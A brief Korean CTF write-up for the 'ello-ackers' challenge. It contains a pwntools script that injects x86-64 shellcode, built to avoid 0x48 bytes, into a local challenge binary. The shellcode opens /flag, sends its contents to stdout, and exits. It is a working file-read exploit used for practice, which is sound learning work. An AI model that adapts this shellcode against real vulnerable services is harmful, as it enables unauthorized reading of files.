# ello ackers! 

**flag파일을 읽어서(H바이트 없이) 출력하는 shellcode 작성해서 입력하는 문제**

-> 풀이코드
```

from pwn import *

context.arch = 'amd64'

shellcode = """

    push 0 -> 0으로 메모리 채우면서 "\0"도 동시에 입력 00 00 00 00 00 00 00 00
    mov dword ptr [rsp], 0x616c662f -> 현재 메모리에서 가리키는 부분에서 4바이트를 채우기 2f 66 6c 61 00 00 00 00
    mov byte ptr [rsp+4], 0x67 -> 4바이트만큼 떨어진 곳에서 1바이트 채우기 2f 66 6c 61 67 00 00 00
    push rsp -> H바이트 안생김

    pop rdi -> H 바이트 안생기며 메모리에 넣은거 꺼내오기
    xor esi, esi
    xor edx, edx
    mov eax, 2
    syscall

    mov edi, 1
    mov esi, eax
    xor edx, edx
    mov r10d, 1000
    mov eax, 40
    syscall

    mov eax, 60
    xor edi, edi
    syscall
"""


shellcode = asm(shellcode)

p = process('/challenge/ello-ackers')
p.send(shellcode)
p.interactive()
```
